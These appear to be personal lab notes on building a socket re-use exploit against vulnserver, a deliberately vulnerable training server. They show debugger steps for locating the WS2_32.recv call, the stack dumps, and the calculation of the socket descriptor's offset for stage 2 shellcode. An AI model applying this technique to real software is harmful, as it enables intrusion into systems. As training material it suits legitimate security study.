# WS2\_32 Socket Re-Use

Reference:
http://ewilded.blogspot.com/2018/01/vulnserver-my-kstet-exploit-delivering.html


## Finding WS2\_32.recv

1. Open vulnserver
2. Attach to process
3. Right click, hover over "View" option
4. Select "Module 'vulnserver'"
5. Right click, hover over "Search for"
6. Select "All intermodular calls"
7. Sort by Destination (this will alphabetize by the called function name
8. Find WS2\_32.recv (sort will occur on recv, not WS2\_32)
9. Right click, copy whole line to clipboard, save it to notes.
10. Press F2 to toggle a breakpoint on this command
11. Validate we hit the breakpoint during client connection


WS2\_32.recv whole line
```
Found intermodular calls, item 89
 Address=00401953
 Disassembly=CALL <JMP.&WS2_32.recv>
 Destination=WS2_32.recv
```

Surrounding commands
```
0040192A  |> 837D 08 00     /CMP DWORD PTR SS:[EBP+8],0              ; |
0040192E  |. 0F84 E60B0000  |JE vulnserv.0040251A                    ; |
00401934  |. C74424 0C 0000>|MOV DWORD PTR SS:[ESP+C],0              ; |
0040193C  |. 8B45 F4        |MOV EAX,DWORD PTR SS:[EBP-C]            ; |
0040193F  |. 894424 08      |MOV DWORD PTR SS:[ESP+8],EAX            ; |
00401943  |. 8B45 F0        |MOV EAX,DWORD PTR SS:[EBP-10]           ; |
00401946  |. 894424 04      |MOV DWORD PTR SS:[ESP+4],EAX            ; |
0040194A  |. 8B85 E0FBFFFF  |MOV EAX,DWORD PTR SS:[EBP-420]          ; |
00401950  |. 890424         |MOV DWORD PTR SS:[ESP],EAX              ; |
00401953  |. E8 D40B0000    |CALL <JMP.&WS2_32.recv>                 ; \recv
```

Address of WS2\_32.recv (via Assemble) command:
```
CALL 0040252C
```

Stack at the time of the call:
```
00B7FA0C   00000080  €...  |Socket = 80
00B7FA10   003E4B20   K>.  |Buffer = 003E4B20
00B7FA14   00001000  ...  |BufSize = 1000 (4096.)
00B7FA18   00000000  ....  \Flags = 0
```

Stack at the time of our stage 2 shellcode:
```
00B7FA08   00B7FA0C  .ú·.
00B7FA0C   EA835A54  TZƒê
00B7FA10   90E2FF46  Fÿâ
00B7FA14   90909090
00B7FA18   90909090
00B7FA1C   90909090
```

Location of 00 00 00 80 at time of stage 2:
```
00B7FB91
```

If we perform a diff:

```
00B7FB91 (Socket FD) - 0B7FA0C (ESP) = 0x185
```

So we need to add 185h
